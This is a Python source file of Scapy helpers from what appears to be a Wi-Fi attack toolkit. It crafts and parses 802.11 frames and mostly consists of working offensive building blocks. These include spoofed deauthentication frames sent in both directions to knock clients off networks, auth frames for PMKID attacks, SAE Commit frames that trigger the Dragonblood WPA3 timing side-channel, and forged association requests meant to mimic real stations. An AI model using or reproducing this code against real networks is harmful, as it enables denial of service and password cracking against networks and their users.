"""Scapy helpers to craft and parse 802.11 beacon/probe/deauth/EAPOL frames."""

from __future__ import annotations

import os

from scapy.layers.dot11 import (
    Dot11,
    Dot11AssoReq,
    Dot11AssoResp,
    Dot11Auth,
    Dot11Beacon,
    Dot11Deauth,
    Dot11Elt,
    Dot11ProbeResp,
    RadioTap,
)
from scapy.layers.eap import EAPOL
from scapy.packet import Packet, Raw

BROADCAST = "ff:ff:ff:ff:ff:ff"

SAE_AUTH_ALGO = 3  # 802.11's Authentication Algorithm Number for SAE (not in scapy's algo enum)
SAE_GROUP_P256 = 19  # the mandatory SAE finite cyclic group -- see attacks/dragonblood.py


def craft_rsn_ie(akms: list[int] | None = None, mfpc: bool = False, mfpr: bool = False) -> Dot11Elt:
    """Craft a minimal RSN IE (CCMP group/pairwise, given AKM suite types)."""
    akms = akms if akms is not None else [2]  # default: PSK
    caps = (0x40 if mfpc else 0) | (0x80 if mfpr else 0)
    info = (
        b"\x01\x00"  # version 1
        + b"\x00\x0f\xac\x04"  # group cipher: CCMP
        + b"\x01\x00\x00\x0f\xac\x04"  # 1 pairwise: CCMP
        + len(akms).to_bytes(2, "little")
        + b"".join(b"\x00\x0f\xac" + bytes([a]) for a in akms)
        + caps.to_bytes(2, "little")
    )
    return Dot11Elt(ID=48, info=info)


def craft_beacon(
    bssid: str,
    ssid: str,
    channel: int = 1,
    privacy: bool = False,
    extra_ies: list[Dot11Elt] | None = None,
) -> Packet:
    """Craft a beacon frame advertising ssid from bssid on channel."""
    dot11 = Dot11(type=0, subtype=8, addr1=BROADCAST, addr2=bssid, addr3=bssid)
    beacon = Dot11Beacon(cap="privacy" if privacy else 0)
    essid = Dot11Elt(ID="SSID", info=ssid.encode())
    ds = Dot11Elt(ID="DSset", info=bytes([channel]))
    pkt = RadioTap() / dot11 / beacon / essid / ds
    for ie in extra_ies or []:
        pkt = pkt / ie
    return pkt


def craft_probe_resp(
    bssid: str,
    ssid: str,
    client: str,
    channel: int = 1,
    privacy: bool = False,
    extra_ies: list[Dot11Elt] | None = None,
) -> Packet:
    """Craft a probe response from bssid to client."""
    dot11 = Dot11(type=0, subtype=5, addr1=client, addr2=bssid, addr3=bssid)
    pkt = (
        RadioTap()
        / dot11
        / Dot11ProbeResp(cap="privacy" if privacy else 0)
        / Dot11Elt(ID="SSID", info=ssid.encode())
        / Dot11Elt(ID="DSset", info=bytes([channel]))
    )
    for ie in extra_ies or []:
        pkt = pkt / ie
    return pkt


def craft_deauth(bssid: str, client: str = BROADCAST, reason: int = 7, low_rate: bool = False, from_client: bool = False) -> Packet:
    """Craft a deauthentication frame from bssid to client (default broadcast).

    low_rate: force the RadioTap Rate field to 6 Mbps (802.11a/g OFDM;
    RadioTap Rate units are 500kbps, so Rate=12) instead of leaving the
    rate unset/auto. Some Realtek chipsets (e.g. RTL8814AU / Alfa
    AWUS1900) are unreliable injecting unset-rate frames across all of
    their antennas -- forcing the lowest common OFDM rate trades a bit
    of airtime for delivery.

    from_client: build the reverse-direction frame instead (spoofed as
    coming FROM client TO bssid) -- addr3 (the BSSID field) stays bssid
    either way, only addr1/addr2 (destination/source) swap. 2026-08-30:
    the vendored aircrack-ng's own aireplay-ng `-0`/`--deauth` (confirmed
    in vendor/aircrack-ng/src/aireplay-ng/aireplay-ng.c's do_attack_deauth)
    always sends BOTH directions per round when a specific client is
    targeted, precisely because a frame lost in one direction (RF noise,
    a dropped retry) can leave the *other* endpoint still thinking it's
    associated. ATWA-NG's own deauth() previously only ever sent the
    AP-to-client direction -- see deauth() below, now fixed to send both
    when a real client (not BROADCAST) is targeted.
    """
    radiotap = RadioTap(present="Rate", Rate=12) if low_rate else RadioTap()
    if from_client:
        dot11 = Dot11(type=0, subtype=12, addr1=bssid, addr2=client, addr3=bssid)
    else:
        dot11 = Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid)
    return radiotap / dot11 / Dot11Deauth(reason=reason)


def with_forced_rate(pkt: Packet, mbps: float) -> Packet:
    """Re-wrap pkt (Dot11 onward) in a fresh RadioTap forcing the TX rate.

    Replaying an already-captured frame verbatim carries its RX RadioTap
    header, which doesn't control the rate we actually transmit at.
    Rebuilding with an explicit low rate (RadioTap Rate is in 500kbps
    units) trades airtime for range/reliability -- useful for WEP ARP
    replay attacks on adapters that drop unset-rate injected frames.
    """
    body = pkt.getlayer(Dot11)
    if body is None:
        return pkt
    return RadioTap(present="Rate", Rate=int(mbps * 2)) / body


def _inject_radiotap() -> RadioTap:
    """RadioTap header for frames we actually inject over the air (not the
    synthetic beacon/probe-resp used only to build test fixtures).

    ORDER (only) asks the kernel not to reorder this frame relative to
    other injected frames — safe with no cost. NOSEQ was dropped: it
    tells the kernel to leave the sequence-control field alone, which is
    only a win if *we* then manage SC ourselves — we don't, so every
    frame was going out as SC=0 every time, a textbook duplicate-frame
    signature real receivers are required to silently drop. Confirmed
    against a known-working reference fake-auth implementation, which
    does manage SC explicitly per send. Sourced from Mathy Vanhoef's
    wifi-injection research (WiSec 2023), github.com/vanhoefm/wifi-injection.
    """
    return RadioTap(present="TXFlags", TXFlags="ORDER")


def craft_auth(bssid: str, client: str, seq: int = 1) -> Packet:
    """Craft an open-system authentication request (used for PMKID attacks)."""
    dot11 = Dot11(type=0, subtype=11, addr1=bssid, addr2=client, addr3=bssid)
    return _inject_radiotap() / dot11 / Dot11Auth(algo=0, seqnum=seq, status=0)


def craft_sae_commit(bssid: str, client: str, group: int = SAE_GROUP_P256, seed: bytes | None = None) -> Packet:
    """Craft an SAE Commit frame (802.11 Authentication, algo=3, seqnum=1)
    -- the message that kicks off a WPA3 SAE handshake, and the trigger
    for the Dragonblood timing side-channel (attacks/dragonblood.py):
    a vulnerable AP receiving this derives ITS OWN password element from
    the real network password and the client MAC in this frame's addr2,
    via the timing-variable hunting-and-pecking loop, before replying
    with its own Commit.

    group: the negotiated finite cyclic group (2 bytes, little-endian) --
    19 (P-256) is SAE's mandatory group and the only one
    dragonblood.py's offline math currently models.

    scalar (32 bytes) and element (64 bytes, raw x||y -- SAE does not use
    TLS-style point compression/prefix bytes) don't need to be
    cryptographically valid for the timing attack to work: the AP only
    needs to accept this as a well-formed Commit and start its own real
    derivation to leak timing, regardless of whether our own scalar/
    element could complete a real handshake. Random per call (seed
    overrides both for deterministic tests) rather than all-zero, since
    an all-zero scalar is a degenerate value some implementations
    explicitly reject before ever reaching the timing-sensitive path.

    No scapy layer exists for the SAE Commit body (group/scalar/element),
    so it's appended as a Raw payload after Dot11Auth's fixed fields --
    same approach frames.py already uses for the WPA1/WPS/OWE vendor IEs
    in secure.py (scapy's own dissector doesn't cover this either)."""
    body = seed if seed is not None else os.urandom(32 + 64)
    if len(body) != 96:
        raise ValueError("seed must be exactly 96 bytes (32-byte scalar + 64-byte element)")
    sae_body = group.to_bytes(2, "little") + body
    dot11 = Dot11(type=0, subtype=11, addr1=bssid, addr2=client, addr3=bssid)
    return _inject_radiotap() / dot11 / Dot11Auth(algo=SAE_AUTH_ALGO, seqnum=1, status=0) / Raw(load=sae_body)


def is_sae_commit(pkt: Packet) -> bool:
    """True if pkt is an 802.11 Authentication frame carrying an SAE
    Commit (algo=3, seqnum=1) -- used to recognize a target AP's reply
    to our own craft_sae_commit() during the Dragonblood timing attack."""
    auth = pkt.getlayer(Dot11Auth)
    return bool(auth is not None and auth.algo == SAE_AUTH_ALGO and auth.seqnum == 1)


def sae_commit_group(pkt: Packet) -> int | None:
    """Return the finite cyclic group ID from an SAE Commit frame's body,
    or None if pkt isn't a recognizable SAE Commit."""
    if not is_sae_commit(pkt):
        return None
    raw_layer = pkt.getlayer(Raw)
    raw = bytes(raw_layer.load) if raw_layer is not None else b""
    if len(raw) < 2:
        return None
    return int.from_bytes(raw[:2], "little")


def craft_probe_req(bssid: str, client: str, ssid: str = "") -> Packet:
    """Craft a probe request frame. Empty ssid is the wildcard/broadcast
    query every AP should answer; a real ssid directs it at one AP.

    Ported from aircrack-ng's aireplay-ng --test attack (PROBE_REQ in
    aireplay-ng.c) rather than wrapping the binary -- same frame shape,
    reimplemented natively.
    """
    dot11 = Dot11(type=0, subtype=4, addr1=bssid, addr2=client, addr3=bssid)
    essid = Dot11Elt(ID="SSID", info=ssid.encode())
    rates = Dot11Elt(ID="Rates", info=b"\x02\x04\x0b\x16\x32\x08\x0c\x12\x18\x24\x30\x48\x60\x6c")
    return _inject_radiotap() / dot11 / essid / rates


def craft_rts(bssid: str, client: str) -> Packet:
    """Craft a Request-To-Send control frame addressed at bssid.

    Control frames carry only addr1 (receiver); no addr2/addr3 field in
    the real 802.11 RTS layout, but scapy's Dot11 always emits addr2 --
    harmless surplus bytes real receivers ignore for this subtype.
    Ported from aireplay-ng --test's RTS constant.
    """
    dot11 = Dot11(type=1, subtype=11, addr1=bssid, addr2=client)
    return _inject_radiotap() / dot11


def craft_null_data(bssid: str, client: str) -> Packet:
    """Craft a null-function data frame (to-DS) from client to bssid --
    a keepalive/no-payload frame real stations send routinely, used here
    as one more "will the AP answer this" probe in the injection test.
    Ported from aireplay-ng --test's NULL_DATA constant.
    """
    dot11 = Dot11(type=2, subtype=4, FCfield="to_DS", addr1=bssid, addr2=client, addr3=bssid)
    return _inject_radiotap() / dot11


def craft_assoc_req(bssid: str, client: str, ssid: str, extra_ies: list[Dot11Elt] | None = None) -> Packet:
    """Craft an association request from client to bssid (needed for WPS).

    cap includes "privacy" — every WPA2 AP's own beacon has that bit set,
    and aircrack-ng's fake-auth echoes the AP's real captured capability
    info rather than a bare ESS-only value; this is the same idea without
    needing a live beacon lookup. Extended Supported Rates IE added
    alongside the basic 8-rate set for the same "look like a real station"
    reason (aircrack-ng's own RATES table is fuller than 8 bytes too).
    """
    dot11 = Dot11(type=0, subtype=0, addr1=bssid, addr2=client, addr3=bssid)
    rates = Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24")
    ext_rates = Dot11Elt(ID=50, info=b"\x30\x48\x60\x6c")  # Extended Supported Rates
    pkt = (
        _inject_radiotap()
        / dot11
        / Dot11AssoReq(cap="ESS+privacy", listen_interval=3)
        / Dot11Elt(ID="SSID", info=ssid.encode())
        / rates
        / ext_rates
    )
    for ie in extra_ies or []:
        pkt = pkt / ie
    return pkt


def assoc_resp_status(pkt: Packet) -> int | None:
    """Return the association-response status code (0 = success), or None."""
    resp = pkt.getlayer(Dot11AssoResp)
    return resp.status if resp else None


def is_eapol(pkt: Packet) -> bool:
    """True if the frame carries an EAPOL (802.1X) payload."""
    return bool(pkt.haslayer(EAPOL))


def eapol_key_info(pkt: Packet) -> tuple[bool, bool] | None:
    """Return (mic_set, ack_set) from a WPA key EAPOL frame, else None.

    The two flag bits identify handshake messages: M1 has ack+!mic,
    M2 has mic+!ack, M3 has ack+mic (with install), M4 has mic+!ack.
    """
    if not is_eapol(pkt):
        return None
    eapol = pkt.getlayer(EAPOL)
    if eapol is None:
        return None
    raw = bytes(eapol.payload)
    if len(raw) < 6:
        return None
    # WPA key frame: [descriptor_type(1)][key_info(2, big-endian)]...
    key_info = int.from_bytes(raw[1:3], "big")
    mic_set = bool(key_info & 0x0100)
    ack_set = bool(key_info & 0x0080)
    return mic_set, ack_set
